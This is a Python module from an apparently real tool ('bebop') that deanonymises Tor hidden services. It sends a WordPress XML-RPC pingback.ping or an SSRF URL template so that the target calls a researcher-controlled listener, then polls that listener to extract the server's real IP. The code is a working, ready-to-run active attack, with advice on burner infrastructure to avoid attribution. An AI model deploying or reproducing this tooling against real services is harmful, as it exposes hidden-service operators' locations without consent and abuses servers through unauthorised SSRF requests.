#!/usr/bin/env python3
# -*- coding: utf-8 -*-
r'''
Out-of-band (OOB) callback deanonymisation.

Every other pivot in bebop is *passive* or *in-band*: we read what the service
leaks. This module is different - it is *active*. It induces the hidden service
to make an outbound network connection to a listener the researcher controls
(interactsh, Burp Collaborator, webhook.site, or a self-hosted logger). When the
origin server dereferences our callback URL, the listener records the origin's
real clearnet egress IP. That is a direct deanonymisation.

Supported vectors (all opt-in):
  * WordPress XML-RPC ``pingback.ping`` - the classic. WordPress fetches the
    supplied ``sourceURI`` server-side to verify the link, and that fetch is the
    callback.
  * Generic SSRF injection - a user-supplied URL template with ``{CALLBACK}``
    substituted, for any URL-accepting parameter the researcher has identified
    (``?url=``, ``?image=``, ``?webhook=``, importer/preview endpoints, ...).

================================ OPSEC WARNING =================================

THIS FEATURE CAN EXPOSE THE RESEARCHER. READ BEFORE ENABLING.

Unlike the rest of bebop - where every request to the target rides over Tor and
the researcher stays anonymous - an OOB callback is deliberately *bidirectional*:

  1. The trigger (pingback / SSRF request) is sent to the onion OVER TOR, so the
     target does not see the researcher on that leg.
  2. BUT the callback URL points at researcher-controlled infrastructure on the
     CLEARNET. When the origin calls back, the target operator can observe:
        - the callback hostname / IP (your listener),
        - the timing, correlated with their inbound onion request,
        - the unique token, tying the interaction to this specific engagement.

Consequences - the researcher CAN be found:
  * A target operator who monitors the origin's outbound traffic, egress
    firewall, or DNS will SEE the connection to your listener and learn your
    callback infrastructure. If that infrastructure is registered to you, hosted
    on an attributable account, or reused across engagements, it deanonymises
    YOU - the mirror image of what you are doing to them.
  * A hostile or honeypot service can deliberately call back to fingerprint,
    scan, or flood your listener, or feed you a decoy source IP (e.g. route the
    callback through their own proxy) to poison your attribution.
  * DNS-only interactions reveal the origin's *resolver* egress, not necessarily
    the origin host itself - do not treat a DNS hit as a host-level deanon.
  * This vector WRITES to the target (pingback attempts, log entries, trackback
    rows). It is noisy, logged on the target side, and in many jurisdictions
    inducing a server to make requests without authorisation is unlawful. Only
    run this against systems you are explicitly authorised to test.

Mitigations (still not zero-risk):
  * Use burner, anonymously-funded callback infrastructure that is NEVER reused
    and NOT linkable to your identity. Prefer a domain/host with no WHOIS or
    hosting ties to you.
  * Assume the operator will see the callback. Accept that the anonymity on the
    Tor leg does NOT extend to the callback leg.
  * Under GitHub Actions the trigger still egresses via Tor, but note the runner
    itself has an attributable (Microsoft/Azure) IP; the clearnet CONFIRMATION
    step elsewhere in bebop is what exposes that runner IP to candidate origins,
    not this module. Poll your listener from infrastructure you are willing to
    burn.

Disabled by default. Enable only by supplying a callback host, and only with
authorisation. bebop logs a warning banner on every run when this is active.
==============================================================================
'''
import time
import uuid
import logging
import ipaddress

import requests

from app.utilities import getsocks, useragentstr

log = logging.getLogger(__name__)
try:
    requests.packages.urllib3.disable_warnings()
except Exception:
    pass

# JSON keys that commonly carry the source address in a listener's hit record
# (interactsh, Burp Collaborator export, webhook.site, custom loggers).
_IP_KEYS = (
    'remote-address', 'remoteaddress', 'remote_addr', 'remoteaddr',
    'source_ip', 'sourceip', 'source-address', 'client_ip', 'clientip',
    'address', 'ip', 'from', 'src', 'src_ip', 'origin_ip',
)


def resolve_config(args=None, env=None):
    '''
    Build the OOB config from CLI args (preferred) or environment variables
    (for CI / GitHub Actions). Returns None when OOB is not enabled.

    Env vars: BEBOP_OOB_CALLBACK, BEBOP_OOB_POLL_URL, BEBOP_OOB_SCHEME,
              BEBOP_OOB_INJECT, BEBOP_OOB_WAIT, BEBOP_OOB_PATH_STYLE.
    '''
    import os
    env = env if env is not None else os.environ

    def pick(attr, envname, default=None):
        val = getattr(args, attr, None) if args is not None else None
        if val is None:
            val = env.get(envname)
        return val if val not in (None, '') else default

    host = pick('oob_callback', 'BEBOP_OOB_CALLBACK')
    if not host:
        return None  # not enabled

    inject = pick('oob_inject', 'BEBOP_OOB_INJECT')
    if isinstance(inject, str):
        inject = [inject]
    elif inject is None:
        inject = []

    try:
        wait = int(pick('oob_wait', 'BEBOP_OOB_WAIT', 25))
    except (TypeError, ValueError):
        wait = 25

    def truthy(v):
        # argparse store_true gives a bool; env gives a string. "0"/"false"/""
        # must read as False (plain bool() on a non-empty string is always True).
        if isinstance(v, bool):
            return v
        return str(v).strip().lower() in ('1', 'true', 'yes', 'on')

    path_style = truthy(pick('oob_path_style', 'BEBOP_OOB_PATH_STYLE', False))

    return {
        'host': host.strip().rstrip('/'),
        'scheme': (pick('oob_scheme', 'BEBOP_OOB_SCHEME', 'http') or 'http').strip(),
        'poll_url': pick('oob_poll_url', 'BEBOP_OOB_POLL_URL'),
        'inject': inject,
        'wait': max(0, wait),
        'path_style': path_style,
    }


def _make_token():
    # short, unique per interaction so listener hits map back to a vector
    return uuid.uuid4().hex[:20]


def _callback_url(config, token):
    host, scheme = config['host'], config['scheme']
    if config['path_style']:
        return f'{scheme}://{host}/{token}'
    # subdomain style (interactsh / collaborator default): token.host
    return f'{scheme}://{token}.{host}'


def _proxies(usetor):
    return getsocks() if usetor else None


def trigger_pingback(url_base, callback, usetor=True, timeout=30):
    '''Send a WordPress XML-RPC pingback.ping with sourceURI = our callback.'''
    xmlrpc = url_base.rstrip('/') + '/xmlrpc.php'
    body = (
        '<?xml version="1.0"?><methodCall>'
        '<methodName>pingback.ping</methodName><params>'
        f'<param><value><string>{callback}</string></value></param>'
        f'<param><value><string>{url_base}</string></value></param>'
        '</params></methodCall>'
    )
    try:
        resp = requests.post(
            xmlrpc, data=body, proxies=_proxies(usetor), verify=False,
            timeout=timeout,
            headers={'User-Agent': useragentstr, 'Content-Type': 'text/xml'})
        log.info('oob: pingback.ping sent to %s (status %s)', xmlrpc, resp.status_code)
        return {'vector': 'xmlrpc-pingback', 'endpoint': xmlrpc,
                'status': resp.status_code}
    except requests.exceptions.RequestException as e:
        log.warning('oob: pingback trigger failed: %s', e)
        return {'vector': 'xmlrpc-pingback', 'endpoint': xmlrpc, 'error': str(e)}


def trigger_inject(template, callback, usetor=True, timeout=30):
    '''Fetch a user-supplied SSRF template with {CALLBACK} substituted.'''
    url = template.replace('{CALLBACK}', callback)
    try:
        resp = requests.get(
            url, proxies=_proxies(usetor), verify=False, timeout=timeout,
            headers={'User-Agent': useragentstr}, allow_redirects=True)
        log.info('oob: SSRF inject fetched %s (status %s)', url, resp.status_code)
        return {'vector': 'ssrf-inject', 'endpoint': url, 'status': resp.status_code}
    except requests.exceptions.RequestException as e:
        log.warning('oob: SSRF inject failed: %s', e)
        return {'vector': 'ssrf-inject', 'endpoint': url, 'error': str(e)}


def trigger(url_base, config, usetor=True):
    '''
    Fire every configured OOB vector. Returns a state dict carrying the token
    (needed later to poll the listener) and per-vector trigger results.
    '''
    _warn_banner()
    token = _make_token()
    callback = _callback_url(config, token)
    log.warning('oob: ACTIVE vector - inducing target to call back to %s '
                '(your infrastructure is exposed to the target; see app/oob.py OPSEC)',
                callback)
    sent = [trigger_pingback(url_base, callback, usetor=usetor)]
    for tmpl in config['inject']:
        sent.append(trigger_inject(tmpl, callback, usetor=usetor))
    return {'token': token, 'callback': callback, 'sent': sent}


def _walk_ips(obj, found):
    '''Recursively pull IP-looking values from a listener's JSON hit record.'''
    if isinstance(obj, dict):
        for k, v in obj.items():
            if isinstance(v, str) and str(k).lower() in _IP_KEYS:
                ip = _parse_ip(v)
                if ip:
                    found.add(ip)
            else:
                _walk_ips(v, found)
    elif isinstance(obj, list):
        for item in obj:
            _walk_ips(item, found)


def _parse_ip(value):
    token = (value or '').strip().split('%')[0]
    # allow "1.2.3.4:5678" host:port forms
    if token.count(':') == 1 and '.' in token:
        token = token.split(':')[0]
    try:
        return str(ipaddress.ip_address(token))
    except ValueError:
        return None


def poll(config, state, usetor=False, attempts=None):
    '''
    Poll the researcher's listener for interactions tied to this token and
    return {'interactions': [...raw...], 'source_ips': [...]}.

    Polling hits YOUR OWN listener, not the target - it does not expose you to
    the target. It defaults to clearnet (direct); set usetor=True to route it
    over Tor as well.
    '''
    result = {'interactions': [], 'source_ips': []}
    poll_url = config.get('poll_url')
    if not poll_url:
        log.warning('oob: no poll URL configured - check your listener manually '
                    'for callbacks to token %s', state['token'])
        return result
    url = poll_url.replace('{TOKEN}', state['token'])
    ips = set()
    # spread a few polls across the wait window to catch a delayed callback
    rounds = attempts if attempts is not None else max(1, min(6, config['wait'] // 5 or 1))
    for i in range(rounds):
        try:
            resp = requests.get(url, proxies=_proxies(usetor), verify=False,
                                timeout=20, headers={'User-Agent': useragentstr})
            if resp.status_code == 200 and resp.text.strip():
                try:
                    data = resp.json()
                    result['interactions'].append(data)
                    _walk_ips(data, ips)
                except ValueError:
                    log.debug('oob: poll response not JSON (%d bytes)', len(resp.text))
        except requests.exceptions.RequestException as e:
            log.debug('oob: poll attempt %d failed: %s', i + 1, e)
        if ips:
            break
        if i < rounds - 1 and config['wait']:
            time.sleep(min(5, config['wait']))
    result['source_ips'] = sorted(ips)
    if ips:
        log.warning('oob: listener recorded callback source IP(s): %s', result['source_ips'])
    else:
        log.info('oob: no callback recorded for token %s (yet)', state['token'])
    return result


_BANNER_SHOWN = False


def _warn_banner():
    global _BANNER_SHOWN
    if _BANNER_SHOWN:
        return
    _BANNER_SHOWN = True
    log.warning('=' * 70)
    log.warning('OOB CALLBACK ENABLED - ACTIVE, INTRUSIVE, ATTRIBUTABLE.')
    log.warning('The callback exposes YOUR listener to the target operator.')
    log.warning('The Tor anonymity on the probe leg does NOT cover the callback')
    log.warning('leg. Use burner infrastructure and only with authorisation.')
    log.warning('See the OPSEC section in app/oob.py before relying on this.')
    log.warning('=' * 70)
